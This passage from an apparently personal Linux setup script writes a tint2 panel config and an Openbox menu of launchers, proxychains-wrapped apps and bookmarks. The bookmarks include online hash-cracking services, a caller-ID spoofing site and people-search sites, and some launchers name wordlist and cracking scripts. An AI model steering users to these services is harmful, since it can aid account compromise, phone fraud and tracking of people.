border_width = 0
background_color = #000000 0
border_color = #000000 50

# ID 2 # tooltip
rounded = 10
border_width = 0
background_color = #000000 30
border_color = #000000 70

# ID 3 # active task
rounded = 10
border_width = 0
background_color = #000000 10
border_color = #000000 70

# ID 4 # Panel
rounded = 7
border_width = 0
background_color = #000000 50
border_color = #000000 20


#-----------------------------
# Panel
#-----------------------------
panel_monitor = all
panel_position = top center horizontal
panel_size = 95% 30
panel_margin = 0 0
panel_padding = 5 3 2
panel_dock = 0
wm_menu = 1
panel_items =  LTSBC
panel_background_id = 4

#-----------------------------
# Taskbar
#-----------------------------
taskbar_mode = multi_desktop
taskbar_padding = 1 1 1
taskbar_background_id = 1
taskbar_active_background_id = 3

#-----------------------------
# Tasks
#-----------------------------
task_icon = 1
task_text = 0
task_centered = 1
task_maximum_size = 30
task_padding = 0 0 0
task_background_id = 0
task_active_background_id = 0
task_active_icon_asb = 100 0 0
task_icon_asb = 30 0 -10

#-----------------------------
# Fonts
#-----------------------------
task_font = snap.se 8
task_font_color = #A1A1A1 100
task_active_font_color = #B1B1B1 100
font_shadow = 0

#-----------------------------
# Systray
#-----------------------------
systray = 1
systray_padding = 2 0 0
systray_sort = ascending
systray_background_id = 0

#-----------------------------
# Clock
#-----------------------------
time1_format = %H:%M
time1_font = snap.se 12
time2_format = %d %a
time2_font = snap.se 8
clock_font_color = #555555 100
clock_padding = 2 0
clock_background_id = 0

#-----------------------------
# Mouse
#-----------------------------
mouse_middle = none
mouse_right = close
mouse_scroll_up = toggle_iconify
mouse_scroll_down = toggle_iconify

#-----------------------------
# Battery
#-----------------------------
battery = 1
battery_low_status = 20
battery_low_cmd = notify-send £+battery low£+
bat1_font = Sans 12
bat2_font = Sans 12
battery_font_color = #555555 100
battery_padding = 2 0
battery_background_id = 0

#---------------------------------------------
# Tooltip
#---------------------------------------------
tooltip = 1
tooltip_padding = 2 2
tooltip_show_timeout = 1
tooltip_hide_timeout = 0.5
tooltip_background_id = 2
tooltip_font_color = #555555 90
tooltip_font = snap.se bold 9

#--------------------------------------------
# Lanchers
#--------------------------------------------
launcher_icon_theme = LinuxLex-8
launcher_padding = 5 0 10
launcher_background_id = 9
launcher_icon_size = 36
launcher_item_app = /usr/share/applications/tint2menu.desktop


" | sed -e 's/£+/"/g' >> tint2rc

}

f_writing_tint2rc

echo "$home/.config/tint2/tint2rc" >> $file

cd $home

}

f_tint2

# Openbox (Obconf | Obmenu | Lxappearance | Autostart | Rc | Menu)
f_openbox () {

echo "[**] Openbox"

echo "  [*] Installing Openbox ... "
apt-get install -y --force-yes openbox openbox-themes 1> /dev/null 2> $LOG

echo "  [*] Installing Obconf ... "
apt-get install -y --force-yes obconf  1> /dev/null 2> $LOG

echo "  [*] Installing Obmenu ... "
apt-get install -y --force-yes obmenu 1> /dev/null 2> $LOG

echo "  [*] Installing Menu & Menu-xdg ... "
apt-get install -y --force-yes menu menu-xdg openbox-xdgmenu 1> /dev/null 2> $LOG

echo "  [*] Installing GTK2-Engines ... "
apt-get install -y --force-yes gtk2-engines 1> /dev/null 2> $LOG

echo "  [*] Installing Lxappearance && Lxappearance-Obconf ... "
apt-get install -y --force-yes lxappearance lxappearance-obconf 1> /dev/null 2> $LOG

echo "  [*] Configuring Openbox ... "
cd $home
echo "exec ck-launch-session dbus-launch openbox-session" >> $home/.xinitrc
cd $home/.config
mkdir -p openbox
echo "$home/.config/openbox" >> $file
cd openbox
mkdir -p scripts
echo "$home/.config/openbox/scripts" >> $file
cd $home

# Menu
f_menu () {

cd $home/.config/openbox
cp /etc/xdg/openbox/menu.xml $home/.config/openbox/menu.xml.back

rm -f menu.xml
touch menu.xml

f_writing_openbox_menu () {
echo "<?xml version=£+1.0£+ encoding=£+UTF-8£+?>

<openbox_menu xmlns=£+http://openbox.org/£+ xmlns:xsi=£+http://www.w3.org/2001/XMLSchema-instance£+ xsi:schemaLocation=£+http://openbox.org/ file:///usr/share/openbox/menu.xsd£+>

<menu id=£+root-menu£+ label=£+Openbox 3£+>
	<item label=£+RoxTerm£+><action name=£+Execute£+><execute>roxterm</execute></action></item>
	<item label=£+WebBrowser£+><action name=£+Execute£+><execute>midori -p</execute></action></item>
	<item label=£+Gmrun£+><action name=£+Execute£+><execute>gmrun</execute></action></item>
	<separator/>
	<item label=£+Update£+><action name=£+Execute£+><execute>roxterm -e bash /opt/darkeffe/update.sh</execute></action></item>
	<separator/>
	<menu id=£+Myscript£+ label=£+Myscript£+>
		<item label=£+CompileC£+><action name=£+Execute£+><execute>roxterm -e compilec</execute></action></item>
		<item label=£+Darkuntu£+><action name=£+Execute£+><execute>roxterm -e darkuntu</execute></action></item>
		<item label=£+FamousIP£+><action name=£+Execute£+><execute>roxterm -e famousip</execute></action></item>
		<item label=£+Fenrir£+><action name=£+Execute£+><execute>roxterm -e fenrir</execute></action></item>
		<item label=£+Firewall£+><action name=£+Execute£+><execute>roxterm -e firewall</execute></action></item>
		<item label=£+DelFirewall£+><action name=£+Execute£+><execute>roxterm -e delfirewall</execute></action></item>
		<item label=£+HiddenServices£+><action name=£+Execute£+><execute>roxterm -e hiddenservices</execute></action></item>
		<item label=£+IsoEdit£+><action name=£+Execute£+><execute>roxterm -e isoedit</execute></action></item>
		<item label=£+LinuxVersion£+><action name=£+Execute£+><execute>roxterm -e linuxversion</execute></action></item>
		<item label=£+MyIP£+><action name=£+Execute£+><execute>roxterm -e myip</execute></action></item>
		<item label=£+RamDisk£+><action name=£+Execute£+><execute>roxterm -e ramdisk</execute></action></item>
		<item label=£+Update£+><action name=£+Execute£+><execute>roxterm -e update</execute></action></item>
		<item label=£+UpdateNvidia£+><action name=£+Execute£+><execute>roxterm -e updatenvidia</execute></action></item>
		<item label=£+UpdateAti£+><action name=£+Execute£+><execute>roxterm -e updateati</execute></action></item>
		<item label=£+Wiki£+><action name=£+Execute£+><execute>roxterm -e wiki</execute></action></item>
		<item label=£+WordlistEd£+><action name=£+Execute£+><execute>roxterm -e worldisted</execute></action></item>
		<item label=£+WordlistGen£+><action name=£+Execute£+><execute>roxterm -e wordlistgen</execute></action></item>
		<separator/>
		<item label=£+Edit Myscript£+><action name=£+Execute£+><execute>geany /opt/darkeffe/*.sh</execute></action></item>
	</menu>
	<separator/>
	<menu id=£+client-list-menu£+ />
	<separator/>
	<menu execute=£+obm-nav / thunar roxterm£+ id=£+/£+ label=£+/£+/>
	<separator/>
	<item label=£+Connected Client£+><action name=£+Execute£+><execute>roxterm -e arp -a</execute></action></item>
	<separator/>
	<menu id=£+Audacious Controller£+ label=£+Audacious£+ execute=£+$home/.config/openbox/scripts/audacious.py£+ />
	<separator/>
	<menu id=£+Sites£+ label=£+Sites£+>
		<menu id=£+root-menu-100-1£+ label=£+Search Engines£+>
			<menu id=£+root-menu-100-1-1£+ label=£+Google£+>
				<item label=£+Google (Web)£+><action name=£+Execute£+><execute>midori -p https://www.google.com/</execute></action></item>
				<item label=£+Google (Immagini)£+><action name=£+Execute£+><execute>midori -p http://www.google.com/imghp?hl=en=wi/</execute></action></item>
				<item label=£+Google (Video)£+><action name=£+Execute£+><execute>midori -p http://video.google.com/?hl=en=wv//</execute></action></item>
				<item label=£+Gmaps£+><action name=£+Execute£+><execute>midori -p http://maps.google.com/maps?hl=en=wl/</execute></action></item>
			</menu>
			<item label=£+Yahoo£+><action name=£+Execute£+><execute>midori -p http://www.yahoo.com/</execute></action></item>
			<item label=£+Bing£+><action name=£+Execute£+><execute>midori -p http://www.bing.com/</execute></action></item>
			<item label=£+DuckDuckGo£+><action name=£+Execute£+><execute>midori -p http://www.duckduckgo.com/</execute></action></item>
		</menu>
		<item label=£+Youtube£+><action name=£+Execute£+><execute>midori -p http://www.youtube.com/</execute></action></item>
		<item label=£+Facebook£+><action name=£+Execute£+><execute>midori -p http://www.facebook.com/</execute></action></item>
		<menu id=£+root-menu-100-2£+ label=£+Mobile Telephone Operators£+>
			<item label=£+TIM£+><action name=£+Execute£+><execute>midori -p http://www.tim.it</execute></action></item>
			<item label=£+Vodafone£+><action name=£+Execute£+><execute>midori -p http://www.vodafone.it/</execute></action></item>
			<item label=£+Wind£+><action name=£+Execute£+><execute>midori -p http://www.wind.it</execute></action></item>
			<item label=£+Tre£+><action name=£+Execute£+><execute>midori -p http://www.tre.it</execute></action></item>
		</menu>
		<item label=£+Social Engineer£+><action name=£+Execute£+><execute>midori -p http://www.social-engineer.org/</execute></action></item>
		<menu id=£+root-menu-100-3£+ label=£+Wiki£+>
			<item label=£+Wikipedia£+><action name=£+Execute£+><execute>midori -p http://www.wikipedia.com/</execute></action></item>
			<item label=£+Nonciclopedia£+><action name=£+Execute£+><execute>midori -p http://nonciclopedia.wikia.com/wiki/Pagina_principale</execute></action></item>
		</menu>
		<menu id=£+root-menu-100-4£+ label=£+E-shops£+>
			<item label=£+Ebay£+><action name=£+Execute£+><execute>midori -p http://www.ebay.it/</execute></action></item>
			<item label=£+TrovaPrezzi£+><action name=£+Execute£+><execute>midori -p http://www.trovaprezzi.it/</execute></action></item>
			<item label=£+SecondaMano£+><action name=£+Execute£+><execute>midori -p http://www.secondamano.it/</execute></action></item>
			<item label=£+Mediaworld£+><action name=£+Execute£+><execute>midori -p http://www.mediaworld.it</execute></action></item>
			<item label=£+Prokoo£+><action name=£+Execute£+><execute>midori -p http://www.prokoo.it/</execute></action></item>
		</menu>
		<menu id=£+root-menu-100-5£+ label=£+Dist£+>
			<item label=£+Ubuntu£+><action name=£+Execute£+><execute>midori -p http://www.ubuntu.com/</execute></action></item>
			<item label=£+Kubuntu£+><action name=£+Execute£+><execute>midori -p http://www.kubuntu.org/</execute></action></item>
			<item label=£+Xubuntu£+><action name=£+Execute£+><execute>midori -p http://www.xubuntu.org/</execute></action></item>
			<item label=£+Lubuntu£+><action name=£+Execute£+><execute>midori -p http://www.lubuntu.net/</execute></action></item>
			<item label=£+BackTrack£+><action name=£+Execute£+><execute>midori -p http://www.backtrack-linux.org/</execute></action></item>
			<item label=£+Debian£+><action name=£+Execute£+><execute>midori -p http://www.debian.org/</execute></action></item>
			<item label=£+Arch£+><action name=£+Execute£+><execute>midori -p http://www.archlinux.com/</execute></action></item>
			<item label=£+Gentoo£+><action name=£+Execute£+><execute>midori -p http://www.gentoo.org/</execute></action></item>
		</menu>
		<menu id=£+root-menu-100-6£+ label=£+ComputerHacking£+>
			<menu id=£+root-menu-100-6-1£+ label=£+Info / Tutorial£+>
				<item label=£+Hack Geek£+><action name=£+Execute£+><execute>midori -p http://www.hackgeek.it/</execute></action></item>
				<item label=£+HackItCafe£+><action name=£+Execute£+><execute>midori -p http://www.hackitcafe.com</execute></action></item>
				<item label=£+Hack Repository£+><action name=£+Execute£+><execute>midori -p http://www.hacktoolrepository.com/</execute></action></item>
				<item label=£+Hash Tables£+><action name=£+Execute£+><execute>midori -p http://hak5.org/forums/index.php?showtopic=12708</execute></action></item>
				<item label=£+Metasploit£+><action name=£+Execute£+><execute>midori -p http://www.metasploit.com/</execute></action></item>
				<item label=£+Metasploit Unleashed£+><action name=£+Execute£+><execute>midori -p http://www.offensive-security.com/metasploit-unleashed/Metasploit_Unleashed_Information_Security_Training</execute></action></item>
				<item label=£+Aircrack Tutorial£+><action name=£+Execute£+><execute>midori -p http://www.aircrack-ng.org/doku.php?id=tutorial</execute></action></item>
				<item label=£+Nmap£+><action name=£+Execute£+><execute>midori -p http://nmap.org/</execute></action></item>
				<item label=£+Pyrit£+><action name=£+Execute£+><execute>midori -p http://code.google.com/p/pyrit/</execute></action></item>
				<item label=£+Durandal Distributed Cracker£+><action name=£+Execute£+><execute>midori -p http://durandal-project.org/index.html</execute></action></item>
	            <item label=£+Bash Guide£+><action name=£+Execute£+><execute>midori -p http://bash.cyberciti.biz/guide/Main_Page</execute></action></item>
			</menu>
			<menu id=£+root-menu-100-6--2£+ label=£+Online crackers and tools£+>
				<item label=£+Awlg£+><action name=£+Execute£+><execute>midori -p http://awlg.org/index.gen</execute></action></item>
				<item label=£+MD5 rednoize£+><action name=£+Execute£+><execute>midori -p http://md5.rednoize.com/</execute></action></item>
				<item label=£+Hash-Cracker.com | MD5 | SHA1 | NTLM£+><action name=£+Execute£+><execute>midori -p http://www.hash-cracker.com/</execute></action></item>
				<item label=£+Multi Site Hash£+><action name=£+Execute£+><execute>midori -p http://www.hashchecker.de/find.html</execute></action></item>
				<item label=£+YouGetSignal£+><action name=£+Execute£+><execute>midori -p http://www.yougetsignal.com/</execute></action></item>
				<item label=£+WhoIsHostingThis£+><action name=£+Execute£+><execute>midori -p http://www.whoishostingthis.com/</execute></action></item>
				<item label=£+UrlToIp£+><action name=£+Execute£+><excute>midori -p http://freelabs.info/UrlToIpOnline.aspx</excute></action></item>
				<item label=£+IpGeoLocator£+><action name=£+Execute£+><execute>midori -p http://www.ipligence.com/geolocation</execute></action></item>
				<item label=£+CallSpoofer£+><action name=£+Execute£+><execute>midori -p http://crazycall.net/</execute></action></item>
			</menu>
		</menu>
		<menu id=£+root-menu-100-7£+ label=£+Programming£+>
			<item label=£+Html http://www.w3schools.com£+><action name=£+Execute£+><execute>midori -p http://www.w3schools.com/</execute></action></item>
			<item label=£+Python.org£+><action name=£+Execute£+><execute>midori -p http://www.python.org/</execute></action></item>
			<item label=£+Wiki Python£+><action name=£+Execute£+><execute>midori -p http://wiki.python.org/</execute></action></item>
		</menu>
		<menu id=£+root-menu-100-8£+ label=£+RealityHacking£+>
			<item label=£+Instructables£+><action name=£+Execute£+><execute>midori -p http://www.instructables.com/</execute></action></item>
			<item label=£+LifeHacker£+><action name=£+Execute£+><execute>midori -p http://lifehacker.com</execute></action></item>
			<item label=£+Hack A Day£+><action name=£+Execute£+><execute>midori -p http://hackaday.com</execute></action></item>
			<item label=£+Art Of Malice£+><action name=£+Execute£+><execute>midori -p http://artofmanliness.com</execute></action></item>
		</menu>
		<menu id=£+root-menu-100-9£+ label=£+Web People Search£+>
			<item label=£+Pipl£+><action name=£+Execute£+><execute>midori -p https://pipl.com//</execute></action></item>
			<item label=£+123People£+><action name=£+Execute£+><execute>midori -p http://www.123people.com///</execute></action></item>
			<item label=£+Pagine Bianche£+><action name=£+Execute£+><execute>midori -p http://www.paginebianche.it/index.html/</execute></action></item>
		</menu>
		<item label=£+File Crop£+><action name=£+Execute£+><execute>midori -p http://www.filecrop.com/</execute></action></item>
		<item label=£+Email Temporanea£+><action name=£+Execute£+><execute>midori -p http://www.emailtemporanea.net/</execute></action></item>
		<item label=£+Devian Art£+><action name=£+Execute£+><execute>midori -p http://www.deviantart.com/</execute></action></item>
		<item label=£+Linux Musicians£+><action name=£+Execute£+><execute>midori -p http://wiki.linuxMusicaians.com/doku.php</execute></action></item>
		<item label=£+KhanAcademy£+><action name=£+Execute£+><execute>midori -p http://www.khanacademy.org/</execute></action></item>
		<item label=£+CleverBot£+><action name=£+Execute£+><execute>midori -p http://www.cleverbot.com/</execute></action></item>
	</menu>
	<separator/>
	<menu id=£+root-menu-1£+ label=£+Places£+>
		<menu id=£+root-menu-1-1£+ label=£+User£+>
			<item label=£+Home£+><action name=£+Execute£+><execute>thunar $home</execute></action></item>
			<item label=£+Scripts£+><action name=£+Execute£+><execute>thunar $home/Scripts</execute></action></item>
			<item label=£+Musica£+><action name=£+Execute£+><execute>thunar $home/Musica</execute></action></item>
			<item label=£+Immagini£+><action name=£+Execute£+><execute>thunar $home/Immagini</execute></action></item>
			<item label=£+Video£+><action name=£+Execute£+><execute>thunar $home/Video</execute></action></item>
			<item label=£+Documenti£+><action name=£+Execute£+><execute>thunar $home/Documenti</execute></action></item>
			<item label=£+Scaricati£+><action name=£+Execute£+><execute>thunar $home/Scaricati</execute></action></item>
			<item label=£+Pentest£+><action name=£+Execute£+><execute>thunar /pentest</execute></action></item>
			<item label=£+Iso£+><action name=£+Execute£+><execute>thunar $home/Iso</execute></action></item>
		</menu>
		<menu id=£+root-menu-1-2£+ label=£+File System£+>
			<item label=£+Bin£+><action name=£+Execute£+><execute>thunar /bin</execute></action></item>
			<item label=£+Dev£+><action name=£+Execute£+><execute>thunar /dev</execute></action></item>
			<item label=£+Etc£+><action name=£+Execute£+><execute>thunar /etc</execute></action></item>
			<item label=£+Home£+><action name=£+Execute£+><execute>thunar /home</execute></action></item>
			<item label=£+Media£+><action name=£+Execute£+><execute>thunar /media</execute></action></item>
			<item label=£+Tmp£+><action name=£+Execute£+><execute>thunar /tmp</execute></action></item>
			<item label=£+Usr£+><action name=£+Execute£+><execute>thunar /usr</execute></action></item>
			<item label=£+Var£+><action name=£+Execute£+><execute>thunar /var</execute></action></item>
		</menu>
		<menu id=£+root-menu-1-3£+ label=£+File Sharing£+>
			<item label=£+Amule Incoming£+><action name=£+Execute£+><execute>thunar $home/.aMule/Incoming</execute></action></item>
			<item label=£+Amule Temp£+><action name=£+Execute£+><execute>thunar $home/.aMule/Temp</execute></action></item>
			<item label=£+FrostWire Saved£+><action name=£+Execute£+><execute>thunar $home/FrostWire/Saved</execute></action></item>
		</menu>
		<item label=£+Octave£+><action name=£+Execute£+><execute>thunar /usr/share/octave/3.2.4/m/school</execute></action></item>
		<item label=£+Mounted Iso£+><action name=£+Execute£+><execute>thunar $home/Iso/Mount</execute></action></item>
	</menu>
	<menu id=£+root-menu-2£+ label=£+Accessori£+>
		<item label=£+Thunar£+><action name=£+Execute£+><execute>thunar</execute></action></item>
		<item label=£+Xarchiver£+><action name=£+Execute£+><execute>xarchiver</execute></action></item>
		<item label=£+Geany£+><action name=£+Execute£+><execute>geany</execute></action></item>
		<item label=£+Gmountiso£+><action name=£+Execute£+><execute>gmountiso</execute></action></item>
		<item label=£+Isomaster£+><action name=£+Execute£+><execute>isomaster</execute></action></item>
		<item label=£+Htop£+><action name=£+Execute£+><execute>roxterm -e htop</execute></action></item>
		<item label=£+Meld File Comparator£+><action name=£+Execute£+><execute>meld</execute></action></item>
		<item label=£+MpiRun£+><action name=£+Execute£+><execute>roxterm -e echo £+mpirun -n [n. threads] program£+</execute></action></item>
		<item label=£+StopWatch£+><action name=£+Execute£+><execute>stopwatch></execute></action></item>
		<item label=£+Virtualbox (4.0)£+><action name=£+Execute£+><execute>virtualbox-4.1</execute></action></item>
	</menu>
	<menu id=£+root-menu-3£+ label=£+Amministrazione£+>
		<menu id=£+root-menu-3-1£+ label=£+Apt-get£+>
			<item label=£+Update£+><action name=£+Execute£+><execute>roxterm -e proxychains apt-get update</execute></action></item>
			<item label=£+Upgrade£+><action name=£+Execute£+><execute>roxterm -e proxychains apt-get upgrade -y</execute></action></item>
			<item label=£+Dist-Upgrade£+><action name=£+Execute£+><execute></execute>roxterm -e proxychains apt-get dist-upgrade -y</action></item>
			<item label=£+Autoremove£+><action name=£+Execute£+><execute>roxterm -e apt-get autoremove -y</execute></action></item>
			<item label=£+Autoremove --purge£+><action name=£+Execute£+><execute>roxterm -e apt-get autoremove --purge -y</execute></action></item>
			<item label=£+Clean£+><action name=£+Execute£+><execute>roxterm -e apt-get clean</execute></action></item>
			<item label=£+Autoclean£+><action name=£+Execute£+><execute>roxterm -e apt-get autoclean</execute></action></item>
			<item label=£+Install -f£+><action name=£+Execute£+><execute>roxterm -e apt-get -f install -y</execute></action></item>
			<item label=£+Delete /var/lib/dpkg/lock£+><action name=£+Execute£+><execute>roxterm rm -f /var/lib/dpkg/lock</execute></action></item>
			<item label=£+Delete /var/cache/apt/archives/lock£+><action name=£+Execute£+><execute>roxterm rm -f /var/cache/apt/archives/lock</execute></action></item>
			<item label=£+Apt-Get Search£+><action name=£+Execute£+><execute>roxterm -e echo apt-cache search [package]</execute></action></item>
			<item label=£+Dpkg Reconfigure£+><action name=£+Execute£+><execute>roxterm -e dpkg-reconfigure</execute></action></item>
			<item label=£+Dpkg Configure -a£+><action name=£+Execute£+><execute>roxterm -e dpkg --configure -a</execute></action></item>
			<item label=£+Dpkg Purge Configuration£+><action name=£+Execute£+><execute>roxterm -e dpkg --purge</execute></action></item>
			<item label=£+Edit Sources.list£+><action name=£+Execute£+><execute> geany /etc/apt/sources.list</execute></action></item>
		</menu>
		<item label=£+Synaptic£+><action name=£+Execute£+><execute>proxychains synaptic</execute></action></item>
		<item label=£+Gparted£+><action name=£+Execute£+><execute>gparted</execute></action></item>
		<menu id=£+root-menu-3-2£+ label=£+Mount£+>
			<item label=£+Mount Device£+><action name=£+Execute£+><execute>roxterm -e echo £+mount [-t filesystem] [-o force]/Dev/sdX /media/MountPoint£+</execute></action></item>
			<item label=£+Unmount Device£+><action name=£+Execute£+><execute>roxterm -e echo £+unmount /Dev/sdX£+</execute></action></item>
			<item label=£+Unmount MountPoint£+><action name=£+Execute£+><execute>roxterm -e echo £+unmount /media/MountPoint£+</execute></action></item>
			<item label=£+Mount Iso£+><action name=£+Execute£+><execute>roxterm -e echo £+mount -o loop immagine.iso /media/MountPoint£+</execute></action></item>
			<item label=£+List Mounted Device£+><action name=£+Execute£+><execute>roxterm -e mount</execute></action></item>
		</menu>
		<item label=£+Disk Utility (palimpsest)£+><action name=£+Execute£+><execute>palimpsest</execute></action></item>
		<item label=£+Boot Manager (bum)£+><action name=£+Execute£+><execute>bum</execute></action></item>
		<item label=£+Htop£+><action name=£+Execute£+><execute>roxterm -e htop</execute></action></item>
		<item label=£+Utenti-Gruppi£+><action name=£+Execute£+><execute>user-admins</execute></action></item>
		<item label=£+Additional Drivers£+><action name=£+Execute£+><execute>jockey-gtk</execute></action></item>
		<item label=£+Nvidia-Settings£+><action name=£+Execute£+><execute>nvidia-settings</execute></action></item>
		<item label=£+Nvidia Overclock£+><action name=£+Execute£+><execute>nvclock_gtk</execute></action></item>
	</menu>
	<menu id=£+root-menu-4£+ label=£+Office£+>
		<menu id=£+root-menu-4-1£+ label=£+LibreOffice£+>
			<item label=£+Writer£+><action name=£+Execute£+><execute>libreoffice -writer</execute></action></item>
			<item label=£+Calc£+><action name=£+Execute£+><execute>libreoffice -calc </execute></action></item>
			<item label=£+Impress£+><action name=£+Execute£+><execute>libreoffice -impress</execute></action></item>
			<item label=£+Draw£+><action name=£+Execute£+><execute>libreoffice -draw</execute></action></item>
			<item label=£+Math£+><action name=£+Execute£+><execute>libreoffice -math</execute></action></item>
		</menu>
		<item label=£+Epdfview£+><action name=£+Execute£+><execute>epdfview</execute></action></item>
		<item label=£+PdfEdit£+><action name=£+Execute£+><execute>pdfedit</execute></action></item>
		<menu id=£+root-menu-4-2£+ label=£+Math£+>
			<item label=£+Geogebra£+><action name=£+Execute£+><execute>geogebra</execute></action></item>
			<menu id=£+root-menu-4-2-1£+ label=£+Octave£+>
				<item label=£+Octave-3.2£+><action name=£+Execute£+><execute>roxterm -e octave-3.2</execute></action></item>
				<item label=£+cd Octave's Script£+><action name=£+Execute£+><execute>thunar /usr/share/octave/3.2.4/m/school</execute></action></item>
				<menu id=£+root-menu-4-2-1-1£+ label=£+Open Octave's Script£+>
					<item label=£+3£+><action name=£+Execute£+><execute>geany /usr/share/octave/3.2.4/m/school/3/*.m</execute></action></item>
					<item label=£+4£+><action name=£+Execute£+><execute>geany /usr/share/octave/3.2.4/m/school/4/*.m</execute></action></item>
				</menu>
			</menu>
			<item label=£+Calcoo£+><action name=£+Execute£+><execute></execute>calcoo</action></item>
			<item label=£+Gbase£+><action name=£+Execute£+><execute>gbase</execute></action></item>
			<item label=£+Gperiodic£+><action name=£+Execute£+><execute>gperiodic</execute></action></item>
		</menu>
	</menu>
	<menu id=£+root-menu-5£+ label=£+Audio-Video£+>
		<item label=£+Gnome-Mplayer£+><action name=£+Execute£+><execute>gnome-mplayer</execute></action></item>
		<item label=£+Audacity£+><action name=£+Execute£+><execute>audacity</execute></action></item>
		<item label=£+Alsamixergui£+><action name=£+Execute£+><execute>alsamixergui</execute></action></item>
		<item label=£+AconnectGui£+><action name=£+Execute£+><execute>aconnectgui</execute></action></item>
		<item label=£+Xfburn£+><action name=£+Execute£+><execute>xfburn</execute></action></item>
		<item label=£+AcidRip£+><action name=£+Execute£+><execute>acidrip</execute></action></item>
		<item label=£+EasyTag£+><action name=£+Execute£+><execute>easytag</execute></action></item>
		<item label=£+Osdlyrics£+><action name=£+Execute£+><execute>proxychains osd-lyrics</execute></action></item>
		<item label=£+Mixxx (Playing Live)£+><action name=£+Execute£+><execute>mixxx</execute></action></item>
		<separator/>
		<menu id=£+root-menu-5-1£+ label=£+Convertitors£+>
			<item label=£+WinFF£+><action name=£+Execute£+><execute>winff</execute></action></item>
			<item label=£+HandBrake£+><action name=£+Execute£+><execute>handbrake-gtk</execute></action></item>
			<item label=£+Lame£+><action name=£+Execute£+><execute>roxterm -e echo £+lame -h [file input] [file output]£+</execute></action></item>
		</menu>
		<menu id=£+root-menu-5-2£+ label=£+VideoEditors£+>
			<item label=£+Pitivi£+><action name=£+Execute£+><execute>pitivi</execute></action></item>
			<item label=£+Kino£+><action name=£+Execute£+><execute>kino</execute></action></item>
			<item label=£+Stopmotion£+><action name=£+Execute£+><execute>stopmotion</execute></action></item>
		</menu>
	</menu>
	<menu id=£+root-menu-6£+ label=£+Grafica£+>
		<item label=£+Gimp£+><action name=£+Execute£+><execute>gimp</execute></action></item>
		<item label=£+Mirage£+><action name=£+Execute£+><execute>mirage</execute></action></item>
	</menu>
	<menu id=£+root-menu-7£+ label=£+Internet£+>
		<item label=£+midori -p£+><action name=£+Execute£+><execute>midori -p</execute></action></item>
		<item label=£+Lynx£+><action name=£+Execute£+><execute>roxterm -e proxychains lynx</execute></action></item>
		<item label=£+Skype£+><action name=£+Execute£+><execute>proxychains skype</execute></action></item>
		<item label=£+Amsn£+><action name=£+Execute£+><execute>proxychains amsn</execute></action></item>
		<item label=£+Pidgin£+><action name=£+Execute£+><execute>proxychains pidgin</execute></action></item>
		<menu id=£+root-menu-7-1£+ label=£+Amule£+>
			<item label=£+Amuled start£+><action name=£+Execute£+><execute>amuled -f</execute></action></item>
			<item label=£+Amuled stop£+><action name=£+Execute£+><execute>pkill amuled</execute></action></item>
			<item label=£+AmuleWeb£+><action name=£+Execute£+><execute>amuleweb</execute></action></item>
			<item label=£+Amule remote controll£+><action name=£+Execute£+><execute>roxterm -e echo £+midori -p http://IP:4711£+</execute></action></item>
			<item label=£+AmuleGui£+><action name=£+Execute£+><execute>amule</execute></action></item>
			<item label=£+Edit amule.conf£+><action name=£+Execute£+><execute>geany $home/.aMule/amule.conf</execute></action></item>
			<item label=£+Edit rc.conf£+><action name=£+Execute£+><execute>geany $home/.aMule/rc.conf</execute></action></item>
			<item label=£+Edit amule-daemon£+><action name=£+Execute£+><execute>geany /etc/default/amule-daemon</execute></action></item>
		</menu>
		<item label=£+Frostwire£+><action name=£+Execute£+><execute>proxychains frostwire</execute></action></item>
		<item label=£+Filezilla£+><action name=£+Execute£+><execute>proxychains filezilla</execute></action></item>
		<item label=£+Vinagre£+><action name=£+Execute£+><execute>proxychains vinagre</execute></action></item>
		<item label=£+Gigolo£+><action name=£+Execute£+><execute>gigolo</execute></action></item>
		<item label=£+pyNeighborhood£+><action name=£+Execute£+><execute>pyNeighborhood</execute></action></item>
		<item label=£+Telnet£+><action name=£+Execute£+><execute>roxterm -e proxychains telnet</execute></action></item>
		<separator/>
		<menu id=£+root-menu-7-2£+ label=£+Proxy£+>
			<item label=£+Edit proxychains.conf£+><action name=£+Execute£+><execute>geany /etc/proxychains.conf</execute></action></item>
			<menu id=£+root-menu-7-2-1£+ label=£+Tor (porta 8118)£+>
				<item label=£+Tor Start£+><action name=£+Execute£+><execute>roxterm -e /etc/init.d/tor start</execute></action></item>
				<item label=£+Tor Stop£+><action name=£+Execute£+><execute>roxterm -e /etc/init.d/tor stop</execute></action></item>
				<item label=£+Tor Restart£+><action name=£+Execute£+><execute>roxterm -e /etc/init.d/tor restart</execute></action></item>
			</menu>
			<menu id=£+root-menu-7-2-2£+ label=£+Privoxy (porta 8118)£+>
				<item label=£+Privoxy Start£+><action name=£+Execute£+><execute>roxterm -e /etc/init.d/privoxy start</execute></action></item>
				<item label=£+Privoxy Stop£+><action name=£+Execute£+><execute>roxterm -e /etc/init.d/privoxy stop</execute></action></item>
				<item label=£+Privoxy Restart£+><action name=£+Execute£+><execute>roxterm -e /etc/init.d/privoxy restart</execute></action></item>
				<item label=£+Edit Privoxy Config£+><action name=£+Execute£+><execute>geany /etc/privoxy/config</execute></action></item>
			</menu>
		</menu>
	</menu>
	<separator/>
	<menu id=£+root-menu-8£+ label=£+Programmazione£+>
		glade ---> gtk interface creator
	</menu>
	<separator/>
	<menu id=£+root-menu-9£+ label=£+Server£+>
		<menu id=£+root-menu-9-1£+ label=£+Mysql Server£+>
			<item label=£+Mysql Start£+><action name=£+Execute£+><execute>roxterm -e service mysql start</execute></action></item>
			<item label=£+Mysql Stop£+><action name=£+Execute£+><execute>roxterm -e service mysql stop</execute></action></item>
			<item label=£+Mysql Restart£+><action name=£+Execute£+><execute>roxterm -e service mysql restart</execute></action></item>
		</menu>
		<menu id=£+root-menu-9-2£+ label=£+Samba£+>
			<item label=£+Samba Start£+><action name=£+Execute£+><execute>roxterm -e /etc/init.d/samba start</execute></action></item>
			<item label=£+Samba Stop£+><action name=£+Execute£+><execute>roxterm -e /etc/init.d/samba stop</execute></action></item>
			<item label=£+Samba Restart£+><action name=£+Execute£+><execute>roxterm -e /etc/init.d/samba restart</execute></action></item>
			<item label=£+Submount£+><action name=£+Execute£+><action>roxterm -e echo £+smbmount //SERVER/condivisione  /media/share£+</action></action></item>
			<item label=£+Cd /media/share£+><action name=£+Execute£+><action>thunar /media/Share</action></action></item>
			<menu id=£+root-menu-9-2-1£+ label=£+SmbClient£+>
				<item label=£+Smbclient --help£+><action name=£+Execute£+><action>roxterm -e smbclient --help</action></action></item>
